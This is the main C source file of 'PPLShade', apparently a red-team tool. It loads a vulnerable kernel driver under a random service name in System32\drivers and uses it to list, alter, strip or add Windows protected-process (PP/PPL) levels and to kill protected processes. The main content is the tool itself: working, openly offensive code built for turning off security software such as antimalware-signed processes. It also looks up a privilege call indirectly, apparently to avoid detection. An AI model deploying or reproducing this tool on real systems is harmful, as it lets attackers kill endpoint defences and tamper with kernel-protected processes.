/*
 *  PPLShade - PPLShade.c
 *  Multi-driver BYOVD PPL manipulation tool.
 *  @j3h4ck | github.com/redteamfortress
 */

#include "common.h"
#include "memory.h"
#include "kstruct_resolve.h"
#include "procguard.h"
#include "memory_translation.h"
#include "strob.h"

static void PrintBanner(void) {
    printf("\n");
    printf(C_MAG "  _____  _____  _      _____ _               _      \n");
    printf("  |  __ \\|  __ \\| |    / ____| |             | |     \n");
    printf("  | |__) | |__) | |   | (___ | |__   __ _  __| | ___ \n");
    printf("  |  ___/|  ___/| |    \\___ \\| '_ \\ / _` |/ _` |/ _ \\\n");
    printf("  | |    | |    | |____| |_) | | | | (_| | (_| |  __/\n");
    printf("  |_|    |_|    |______|____/|_| |_|\\__,_|\\__,_|\\___|" C_RST "\n");
    printf(C_GRY "  +------------------------------------------------+\n");
    printf("  |" C_RST C_BLD "   P P L S h a d e   v1.0                     " C_RST C_GRY "|\n");
    printf("  |" C_RST C_DIM "   Multi-driver BYOVD PPL manipulation        " C_RST C_GRY "|\n");
    printf("  |" C_RST C_DIM "   @j3h4ck | github.com/redteamfortress      " C_RST C_GRY "|\n");
    printf("  +------------------------------------------------+" C_RST "\n");
    printf("\n");
}

static void PrintUsage(wchar_t* prog) {
    printf(C_CYN "  USAGE:" C_RST " %S <command> [args]\n\n", prog);
    printf(C_CYN "  Driver Management:" C_RST "\n");
    printf("    load      <driver.sys>        Copy to random name, create service, start driver\n");
    printf("    unload                        Stop and delete the loaded driver service\n\n");
    printf(C_CYN "  Commands:" C_RST "\n");
    printf("    list                          List all protected processes\n");
    printf("    get       <PID>               Query protection of a process\n");
    printf("    set       <PID> <PP|PPL> <T>  Change protection level + signer\n");
    printf("    protect   <PID> <PP|PPL> <T>  Add protection to unprotected process\n");
    printf("    unprotect <PID>               Strip all protection from process\n");
    printf("    kill      <PID>               Unprotect + terminate process\n\n");
    printf(C_YLW "  Signer Types:" C_RST " Authenticode, CodeGen, Antimalware, Lsa, Windows, WinTcb, WinSystem, App\n\n");
}

static BOOL EnableDbgPriv(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) { CloseHandle(hToken); return FALSE; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    HMODULE hA = LoadLibraryA("advapi32.dll");
    if (hA) {
        fn_AdjTP pAdj = (fn_AdjTP)GetProcAddress(hA, "AdjustTokenPrivileges");
        if (pAdj) pAdj(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        FreeLibrary(hA);
    }
    CloseHandle(hToken);
    return (GetLastError() == ERROR_SUCCESS);
}

// ═══════════════════════════════════════════════════════════
//  Driver load/unload — random service name, copy to System32
// ═══════════════════════════════════════════════════════════

#define PPLSHADE_SVC_FILE  "pplshade_svc.tmp"  // stores the service name between load/unload

static void GenRandomName(char* buf, int len) {
    // Random lowercase alpha name
    LARGE_INTEGER pc;
    QueryPerformanceCounter(&pc);
    DWORD seed = (DWORD)(pc.QuadPart ^ GetCurrentProcessId());
    for (int i = 0; i < len; i++) {
        seed = seed * 1103515245 + 12345;
        buf[i] = 'a' + ((seed >> 16) % 26);
    }
    buf[len] = '\0';
}

static int CmdLoad(const wchar_t* driverPath) {
    // Verify source file exists
    DWORD attr = GetFileAttributesW(driverPath);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        errorW(L"File not found: %s", driverPath);
        return 2;
    }

    // Generate random service name (8 chars)
    char svcName[12] = { 0 };
    GenRandomName(svcName, 8);

    // Build destination path: C:\Windows\System32\drivers\<random>.sys
    char sysDir[MAX_PATH] = { 0 };
    GetSystemDirectoryA(sysDir, MAX_PATH);
    char dstPath[MAX_PATH] = { 0 };
    sprintf_s(dstPath, MAX_PATH, "%s\\drivers\\%s.sys", sysDir, svcName);

    // Copy driver to destination
    info("Copying driver to %s", dstPath);
    WCHAR dstPathW[MAX_PATH] = { 0 };
    for (int i = 0; dstPath[i] && i < MAX_PATH - 1; i++)
        dstPathW[i] = (WCHAR)dstPath[i];

    if (!CopyFileW(driverPath, dstPathW, FALSE)) {
        error("CopyFile failed: 0x%08X", GetLastError());
        return 2;
    }
    okay("Driver copied");

    // Build full NT path for service
    char binPath[MAX_PATH] = { 0 };
    sprintf_s(binPath, MAX_PATH, "\\SystemRoot\\System32\\drivers\\%s.sys", svcName);

    // Open SCM
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        error("OpenSCManager failed: 0x%08X (need admin)", GetLastError());
        DeleteFileW(dstPathW);
        return 2;
    }

    // Create service
    info("Creating service: %s", svcName);
    SC_HANDLE hSvc = CreateServiceA(
        hSCM, svcName, svcName,
        SERVICE_START | SERVICE_STOP | DELETE,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        binPath, NULL, NULL, NULL, NULL, NULL
    );
    if (!hSvc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            // Service already exists, open it
            hSvc = OpenServiceA(hSCM, svcName, SERVICE_START | SERVICE_STOP | DELETE);
        }
        if (!hSvc) {
            error("CreateService failed: 0x%08X", GetLastError());
            CloseServiceHandle(hSCM);
            DeleteFileW(dstPathW);
            return 2;
        }
    }
    okay("Service created");

    // Start service
    info("Starting driver...");
    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            okay("Driver already running");
        } else {
            error("StartService failed: 0x%08X", err);
            // Cleanup on failure
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            DeleteFileW(dstPathW);
            return 2;
        }
    } else {
        okay("Driver started");
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    // Save service name + driver path for unload
    HANDLE hFile = CreateFileA(PPLSHADE_SVC_FILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char data[512] = { 0 };
        sprintf_s(data, sizeof(data), "%s\n%s", svcName, dstPath);
        DWORD bw = 0;
        WriteFile(hFile, data, (DWORD)strlen(data), &bw, NULL);
        CloseHandle(hFile);
    }

    okay("Service name: %s", svcName);
    okay("Driver path:  %s", dstPath);
    printf("\n");
    info("Run 'unload' to stop and clean up when done.");
    return 0;
}

static int CmdUnload(void) {
    // Read service name and driver path from temp file
    HANDLE hFile = CreateFileA(PPLSHADE_SVC_FILE, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        error("No loaded driver found (missing %s)", PPLSHADE_SVC_FILE);
        return 2;
    }
    char data[512] = { 0 };
    DWORD br = 0;
    ReadFile(hFile, data, sizeof(data) - 1, &br, NULL);
    CloseHandle(hFile);

    // Parse: line 1 = service name, line 2 = driver path
    char svcName[64] = { 0 };
    char drvPath[MAX_PATH] = { 0 };
    char* nl = strchr(data, '\n');
    if (!nl) { error("Corrupt state file"); return 2; }
    *nl = '\0';
    strcpy_s(svcName, sizeof(svcName), data);
    strcpy_s(drvPath, sizeof(drvPath), nl + 1);

    info("Stopping service: %s", svcName);

    // Open SCM and service
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) { error("OpenSCManager failed: 0x%08X", GetLastError()); return 2; }

    SC_HANDLE hSvc = OpenServiceA(hSCM, svcName, SERVICE_STOP | DELETE);
    if (!hSvc) {
        error("OpenService failed: 0x%08X", GetLastError());
        CloseServiceHandle(hSCM);
        return 2;
    }

    // Stop service
    SERVICE_STATUS ss = { 0 };
    if (ControlService(hSvc, SERVICE_CONTROL_STOP, &ss)) {
        okay("Driver stopped");
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_NOT_ACTIVE)
            info("Driver was not running");
        else
            warn("ControlService(STOP) failed: 0x%08X", err);
    }

    // Delete service
    if (DeleteService(hSvc))
        okay("Service deleted");
    else
        warn("DeleteService failed: 0x%08X", GetLastError());

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    // Delete driver file
    if (DeleteFileA(drvPath))
        okay("Driver file deleted: %s", drvPath);
    else
        warn("Could not delete driver file: 0x%08X", GetLastError());

    // Delete state file
    DeleteFileA(PPLSHADE_SVC_FILE);

    okay("Cleanup complete");
    return 0;
}

// ═══════════════════════════════════════════════════════════
//  Entry point
// ═══════════════════════════════════════════════════════════

int wmain(int argc, wchar_t* argv[]) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    if (hOut != INVALID_HANDLE_VALUE && GetConsoleMode(hOut, &dwMode))
        SetConsoleMode(hOut, dwMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);

    PrintBanner();

    if (argc < 2) { PrintUsage(argv[0]); return 1; }

    wchar_t* cmd = argv[1];

    // Handle load/unload before full init
    if (!_wcsicmp(cmd, L"load")) {
        if (argc < 3) { error("Usage: load <driver.sys>"); return 1; }
        EnableDbgPriv();
        return CmdLoad(argv[2]);
    }
    if (!_wcsicmp(cmd, L"unload")) {
        EnableDbgPriv();
        return CmdUnload();
    }

    // Full init for all other commands
    EnableDbgPriv();

    DWORD offsets[KF_MAX] = { 0 };
    info("Initializing...");
    if (!ResolveKernelStructs(offsets)) { error("Init failed"); return 2; }

    info("Mapping...");
    if (!InitializeMemoryTranslation()) { error("Map failed"); return 2; }
    okay("Ready");
    printf("\n");

    info("Probing drivers...");
    HANDLE hDevice = MemoryAutoDetect();
    if (hDevice == INVALID_HANDLE_VALUE) {
        error("No supported driver found. Load one first then retry.");
        CleanupMemoryTranslation();
        return 2;
    }
    okay("Detected: %s", MemoryDriverName(MemoryGetDriver()));
    printf("\n");

    int exitCode = 0;
    DWORD dwPid;

    if (!_wcsicmp(cmd, L"list")) {
        if (!EnumShieldedProcs(hDevice, offsets)) exitCode = 2;
    }
    else if (!_wcsicmp(cmd, L"get")) {
        if (argc < 3) { error("Usage: get <PID>"); exitCode = 1; goto done; }
        dwPid = wcstoul(argv[2], NULL, 10);
        if (!dwPid) { error("Invalid PID"); exitCode = 1; goto done; }
        if (!QueryProcShield(hDevice, offsets, dwPid)) exitCode = 2;
    }
    else if (!_wcsicmp(cmd, L"set")) {
        if (argc < 5) { error("Usage: set <PID> <PP|PPL> <Signer>"); exitCode = 1; goto done; }
        dwPid = wcstoul(argv[2], NULL, 10);
        if (!dwPid) { error("Invalid PID"); exitCode = 1; goto done; }
        if (!WriteProcShield(hDevice, offsets, dwPid, argv[3], argv[4])) exitCode = 2;
    }
    else if (!_wcsicmp(cmd, L"protect")) {
        if (argc < 5) { error("Usage: protect <PID> <PP|PPL> <Signer>"); exitCode = 1; goto done; }
        dwPid = wcstoul(argv[2], NULL, 10);
        if (!dwPid) { error("Invalid PID"); exitCode = 1; goto done; }
        if (!ApplyProcShield(hDevice, offsets, dwPid, argv[3], argv[4])) exitCode = 2;
    }
    else if (!_wcsicmp(cmd, L"unprotect")) {
        if (argc < 3) { error("Usage: unprotect <PID>"); exitCode = 1; goto done; }
        dwPid = wcstoul(argv[2], NULL, 10);
        if (!dwPid) { error("Invalid PID"); exitCode = 1; goto done; }
        if (!StripProcShield(hDevice, offsets, dwPid)) exitCode = 2;
    }
    else if (!_wcsicmp(cmd, L"kill")) {
        if (argc < 3) { error("Usage: kill <PID>"); exitCode = 1; goto done; }
        dwPid = wcstoul(argv[2], NULL, 10);
        if (!dwPid) { error("Invalid PID"); exitCode = 1; goto done; }
        if (!KillProc(hDevice, offsets, dwPid)) exitCode = 2;
    }
    else {
        errorW(L"Unknown command: %s", cmd);
        PrintUsage(argv[0]);
        exitCode = 1;
    }

done:
    CloseHandle(hDevice);
    CleanupMemoryTranslation();
    printf("\n");
    return exitCode;
}
